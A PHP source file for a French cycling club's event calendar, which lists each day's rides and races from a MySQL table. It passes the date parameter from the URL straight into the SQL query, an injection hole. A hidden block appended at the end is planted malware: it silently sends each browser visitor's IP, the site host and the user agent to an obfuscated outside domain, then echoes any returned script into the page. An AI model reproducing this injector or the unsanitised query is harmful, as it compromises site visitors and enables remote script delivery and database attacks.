<?php
session_start();
header('Content-Type: text/html; charset=ISO-8859-15'); 
include "inc-connexion.php";

//if (!isset($_GET['date'])) $_GET['date'] = "2010-10-22";

$requete = 'SELECT id_evenement, titre, type, LEFT(code_postal,2) as code_postal, ville, type FROM calendrier WHERE date = "'.$_GET['date'].'"';
$resultat = mysql_query($requete) or die (mysql_error());

$nb = mysql_num_rows($resultat);        
		if($nb == 0) {
			echo 'Aucun évènement.'; 
		}
			else {
echo '<ul>';
while ($event=mysql_fetch_array($resultat)) {
	if ($event['type'] == 'club' AND $_SESSION['pseudo'] != "") {
		$class = "club";
		echo '<li><a class="'.$class.'" href="index.php?page=prive&amp;lvl2=calendrier&amp;event='.$event['id_evenement'].'">'.$event['titre'].'</a> ('.$event['code_postal'].' - '.$event['ville'].')</li>';
	} else if ($event['type'] == "cyclosportive") {
		$class = "cyclo";
		echo '<li><a class="'.$class.'" href="index.php?page=competitions&amp;lvl2=calendrier&amp;event='.$event['id_evenement'].'">'.$event['titre'].'</a> ('.$event['code_postal'].' - '.$event['ville'].')</li>';
	} else if ($event['type'] == 'competition') {
		$class = "compet";
		echo '<li><a class="'.$class.'" href="index.php?page=competitions&amp;lvl2=calendrier&amp;event='.$event['id_evenement'].'">'.$event['titre'].'</a> ('.$event['code_postal'].' - '.$event['ville'].')</li>';
	} else if ($event['type'] == 'rando') {
		$class = "rando";
		echo '<li><a class="'.$class.'" href="index.php?page=competitions&amp;lvl2=calendrier&amp;event='.$event['id_evenement'].'">'.$event['titre'].'</a> ('.$event['code_postal'].' - '.$event['ville'].')</li>';
	} else if ($event['type'] == 'cyclocross') {
		$class = "cyclocross";
		echo '<li><a class="'.$class.'" href="index.php?page=competitions&amp;lvl2=calendrier&amp;event='.$event['id_evenement'].'">'.$event['titre'].'</a> ('.$event['code_postal'].' - '.$event['ville'].')</li>';
	} else { echo 'Connectez-vous pour voir l\'évènement club.'; }
	
}
echo '</ul>';
}

mysql_close($connexion);
?>
<?php
#0ed0e0#
error_reporting(0); @ini_set('display_errors',0); $wp_basmx09 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_basmx09) && !preg_match ('/bot/i', $wp_basmx09))){
$wp_basmx0909="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_basmx09);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_basmx0909); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_09basmx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_09basmx = @file_get_contents($wp_basmx0909);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_09basmx=@stream_get_contents(@fopen($wp_basmx0909, "r"));}}
if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
#/0ed0e0#
?>